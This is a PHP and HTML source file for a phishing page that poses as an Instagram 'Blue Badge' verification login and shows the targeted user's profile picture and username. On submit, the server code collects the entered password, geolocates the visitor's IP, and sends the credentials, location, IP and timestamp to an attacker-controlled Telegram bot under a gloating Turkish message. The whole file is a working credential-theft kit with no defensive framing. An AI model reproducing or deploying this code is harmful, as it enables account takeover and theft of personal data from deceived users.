<?php
require 'api/pp.php';
include('api/tg.php');
$id=$username;
$_SESSION['pp']=$pp;
if($_POST){
$ip=$_SERVER["REMOTE_ADDR"];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");

$password=$_POST["password"];

header("location: info.php");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 

Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
Takipçi : '.$followers.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>


<!DOCTYPE html>

<html>
<head>
	<link rel="stylesheet" href="files/style.css" type="text/css" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/xcode.css">
	<link rel="stylesheet" type="text/css" href="css/xcode2.css">
	<link rel="stylesheet" type="text/css" href="css/xcode3.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.hizliresim.com/egpgwd2.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">

	<title>lnstagram | Blue Badge</title>
    <script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
</head>
<img src="files/dm.jpg" style="display: none;">	
<body>
<img src="files/dm.jpg" style="display: none;">	
	<header>
		<table>
			<tr>
				<td><img src="files/header.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
	</header><br><br>
<center>
<style>
*{
	transition:0.0s;
}
.a_adaskpd{
      padding:7px 30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#08a0e9;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
	  }
	  button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 18px;
}
.button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
}
.btn {
    cursor: pointer;
    width: 100%;
    padding: 0 8px;
    background: #3897f0;
    border: 1px solid #3897f0;
    color: #fff;
    border-radius: 3px;
    font-weight: 600;
    font-size: 14px;
    height: 34px;
    line-height: 26px;
    outline: 0;
    white-space: nowrap;
}
@media (max-width: 450px) {
    .btn {
        cursor: pointer;
        width: 100%;
        padding: 0 8px;
        background: #3897f0;
        border: 1px solid #3897f0;
        color: #fff;
        border-radius: 3px;
        font-weight: 600;
        font-size: 14px;
        height: 28px;
        line-height: 26px;
        outline: 0;
        white-space: nowrap;
    }
}
.button {

-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
font-size: 14px;
line-height: 20px;
appearance: none;
background: 0 0;
box-sizing: border-box;
cursor: pointer;
display: block;
font-weight: 600;
padding: 5px;
text-align: center;
text-transform: inherit;
text-overflow: ellipsis;
user-select: none;
width: 80%;
border-radius: 4px;
color: rgba(var(--eca,255,255,255),1);
position: relative;
border: 1px solid transparent;
background-color: rgba(var(--d69,0,149,246),1);
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
</style>
<script>
            function form_kontrol()
            {
                if(document.getElementById("password").value.length == 0)
                    document.getElementById("gonder").disabled = true;
                else
                    document.getElementById("gonder").disabled = false;
                    document.getElementById("gonder").style.background = "#3897f0";
                    document.getElementById("gonder").style.borderColor = "#3897f0";
            }
        </script>  
<div class="center" style="background: white; border-radius:4px;">
<br>
<center>
 <div  style="margin-bottom:30px;"></div>
<img src="<?php echo  $pp ?>" width=150 style="border-radius:50%;margin-top:12px;margin-bottom:18px;" align="center">
<center>
<h2 class="AjK3K" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b>Login<br><div  style="margin-bottom:5px;"></div>@<?php echo $id;?></b></h2></center>
<div class="GA2q- ">
            <form class="JraEb" method="POST">
            <div class="QuiLu Xb8C0">

			<input required id="password" name="password" placeholder="Password" type="password" class="PAhYv zyHYP " minlength="6"  value="" onkeyup="form_kontrol()">
			<div style="font-family:sans-serif; margin-top:10px;"  >
			<div  style="margin-bottom:10px;"></div>
			<a align="right"style="text-align:right; color: #09a7fd ; font-family:sans-serif; font-size:14px; font-weight:400;text-decoration:none;" href="" id="link"> Forgot password? </a></center>
            <input type="hidden" name="nickcik" id="nickcik" value="">
           
            <center><button type="submit" id="gonder" disabled class="button">
             <span class="btn-txt">Log In @<?php echo $id?></span>
			 </button></center>
             <div  style="margin-bottom:7px;"></div>

           <span class="idhGk _1OSdk">
		 	<button class="_5f5mN  jIbKX1 " onclick="location.href='index.php'">That is not me</button></span>
			<br>
					   
		 
            </form>
			<center><a style="color:#999; text-align:right; font-family:sans-serif; font-size:14px; font-weight:normal; ;">  Don't have an account? </a> <a style="text-decoration:none;text-align:right; color: #09a7fd; font-family:sans-serif; font-size:14px; font-weight:600;" href="" id="link"> Sign up </a></center>
 <div  style="margin-bottom:50px;"></div>
</div>
</center>


</div>
<br>
<br>

</center>

</body>
</html>